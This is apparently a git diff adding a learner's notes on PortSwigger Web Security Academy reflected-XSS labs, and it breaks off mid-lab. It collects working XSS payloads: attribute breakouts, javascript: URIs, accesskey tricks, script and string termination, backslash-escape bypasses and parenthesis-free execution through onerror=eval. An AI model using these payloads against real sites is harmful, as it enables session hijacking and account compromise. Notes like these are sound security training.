@@ -94,10 +94,24 @@ location='https://0a62006b0338f43b81457a6a005100ed.web-security-academy.net/?sea
 location='https://0a62006b0338f43b81457a6a005100ed.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert%28document.cookie%29+id%3D%27X%27+tabindex%3D1%3E%#X'
 </script>
 ```
-# LAB 4: Reflected Xss with event handlers and href attribute blocked
+# LAB 4: Reflected Xss with event handlers and href attribute blocked (EXPERT LEVEL)
 - First lets search for the whitlisted tags
-- The following tags are whitelisted, a, image, title and svg
+- The following tags are whitelisted, a, animate image, title and svg
 - All I am trying has not worked, I will continue to tomorrow, Insha aa Allah
+- This is very crazy, To solve this we have to know whats available
+- The animate tag contains attributeName attribute that can set the attribute of it's parent tag
+- The payload goes like this:
+```
+<svg>
+  <a>
+    <animate attributeName=href values=javasript:alert(1) />
+    <text x=20 y=20>Click Me</text>
+  </a>
+</svg>
+```
+- Now to going through the community solutions
+- To learn more about svgs is the way to unlock tags XSS
+
 
 
 # LAB 5: Reflected XSS with some svg markup allowed
@@ -107,5 +121,194 @@ location='https://0a62006b0338f43b81457a6a005100ed.web-security-academy.net/?sea
 - I asked it to give me all the event handlers of animateTransform and I got onbegin
 - I asked it to fire alert with onbegin, and here is the final payload
 ```
-<svg><rect+><animateTransform+onbegin%3D"alert%28%27Animation+started%27%29"+%29"%2F><%2Frect><%2Fsvg>
+<svg><rect><animateTransform+onbegin%3D"alert%28%27Animation+started%27%29"+%29"%2F><%2Frect><%2Fsvg>
 ```
+
+# XSS in HTML tag attributes
+- When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. 
+- For example:
+```
+"><script>alert(document.domain)</script>
+```
+- More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. 
+- Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. 
+- For example:
+```
+" autofocus onfocus=alert(document.domain) x="
+```
+- The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. 
+- Finally, it adds x=" to gracefully repair the following markup.
+
+# LAB 6: Reflected XSS into attribute with angle brackets HTML-encoded
+- The lab has a HINT
+- Just because you're able to trigger the alert() yourself doesn't mean that this will work on the victim. 
+- You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.
+- Solving this lab was easy for me, that I don't even  realised have done it, anyways payload here
+```
+Hello"%20onfocus=alert(1)%20autofocus%20x="
+```
+
+- Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. 
+- Here, you can execute JavaScript without needing to terminate the attribute value. 
+- For example, if the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script. 
+- For example:
+```
+<a href="javascript:alert(document.domain)">
+```
+
+- You might encounter websites that encode angle brackets but still allow you to inject attributes.
+- Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag. 
+- You can exploit this behavior using access keys and user interaction on Chrome. 
+- Access keys allow you to provide keyboard shortcuts that reference a specific element. 
+- The accesskey attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire.
+- The question is What are Access Key and cannonical tags?
+```
+<input type="hidden" name="redacted" value="default" injection="xss" />
+```
+- XSS in hidden inputs is frequently very difficult to exploit because typical JavaScript events like onmouseover and onfocus can't be triggered due to the element being invisible.
+- We can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination.
+- On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. 
+- You can specify a different key combination using a different key in the access key attribute. 
+- Here is the vector:
+```
+<input type="hidden" accesskey="X" onclick="alert(1)">
+```
+- Please note if your reflection is repeated then the key combination will fail. 
+- A workaround is to then inject another attribute that breaks the second reflection. e.g. " accesskey="x" onclick="alert(1)" x='
+
+# Lab 7: Reflected XSS in canonical link tag
+- This lab reflects user input in a canonical link tag and escapes angle brackets.
+- To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.
+- To solve this lab
+- I struggled in finding the injection point at first but on instepecting the home page I found a link with canonical rel so I constructed this payload
+```
+?hello'accesskey='x'onclick='alert(1)
+```
+- And the lab was solved.
+
+# XSS into JavaScript
+- When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit.
+
+# Terminating the existing script
+- In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. 
+-For example, if the XSS context is as follows:
+```
+<script>
+...
+var input = 'controllable data here';
+...
+</script>
+```
+- then you can use the following payload to break out of the existing JavaScript and execute your own:
+```
+</script><img src=1 onerror=alert(document.domain)>
+```
+- The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. 
+- The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.
+
+# LAB 8: Reflected XSS into a JavaScript string with single quote and backslash escaped
+- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. 
+- The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
+- To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+- Solving this lab, I was overthinking it and did not follow the above instructions that the browser first performs HTML parsing before running javascript.
+- So the solution is:
+```
+</script><script>alert(1)</script>
+```
+# Breaking out of a JavaScript string
+- In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. 
+- It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.
+- Some useful ways of breaking out of a string literal are:
+```
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
+
+# Lab 9: Reflected XSS into a JavaScript string with angle brackets HTML encoded
+- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. 
+- The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+- This lab was not hard at all
+- Solution
+```
+';alert(1)//
+```
+
+- Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. 
+- A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. 
+- In this situation, applications often make the mistake of failing to escape the backslash character itself. 
+- This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.
+- For example, suppose that the input:
+```
+';alert(document.domain)//
+```
+- gets converted to:
+```
+\';alert(document.domain)//
+```
+You can now use the alternative payload:
+```
+\';alert(document.domain)//
+```
+which gets converted to:
+```
+\\';alert(document.domain)//
+```
+- Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. 
+- This means that the quote is now interpreted as a string terminator, and so the attack succeeds.
+
+# Lab 10: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
+- To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+- This lab was not that add and not far from the previous one
+- Solution
+```
+\';alert(1)//
+``` 
+
+- Some websites make XSS more difficult by restricting which characters you are allowed to use. 
+- This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. 
+- In these situations, you need to experiment with other ways of calling functions which bypass these security measures. 
+- One way of doing this is to use the throw statement with an exception handler. 
+- This enables you to pass arguments to a function without using parentheses. 
+- The following code assigns the alert() function to the global exception handler and the throw statement passes the 1 to the exception handler (in this case alert). 
+- The end result is that the alert() function is called with 1 as an argument.
+```
+onerror=alert;throw 1
+```
+- There are multiple ways of using this technique to call functions without parentheses.
+
+# Call functions without parenthesis
+- https://thespanner.co.uk/hacking-rooms
+- https://portswigger.net/research/xss-without-parentheses-and-semi-colons
+- From the above Articles I got the following:
+- I encountered a site that was filtering parentheses and semi-colons, and I thought it must be possible to adapt this technique to execute a function without a semi-colon. 
+- The first way is pretty straightforward: you can use curly braces to form a block statement in which you have your onerror assignment. 
+- After the block statement you can use throw without a semi-colon (or new line):
+```
+<script>{onerror=alert}throw 1337</script>
+<script>throw onerror=alert,'some string',123,'haha'</script>
+```
+- If you've tried running the code you'll notice that Chrome prefixes the string sent to the exception handler with "Uncaught".
+- In my previous blog post I showed how it was possible to use eval as the exception handler and evaluate strings. 
+- To recap you can prefix your string with an = which then makes the 'Uncaught' string a variable and executes arbitrary JavaScript. For example:
+```
+<script>{onerror=eval}throw'=alert\x281337\x29'</script>
+<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
+```
+- You can use the fileName property to send a second argument on Firefox too:
+```
+<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
+```
+- After I posted this stuff on Twitter @terjanq and @cgvwzq (Pepe Vila) followed up with some cool vectors. Here @terjanq removes all string literals:
+```
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+```
+Pepe removed the need of the throw statement completely by using type errors to send a string to the exception handler. 
+```
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+```
+# Lab 11: Reflected XSS in a JavaScript URL with some characters blocked EXpert level
+- This lab reflects your input in a JavaScript URL, but all is not as it seems. 
+- This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.
+- To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.
+-
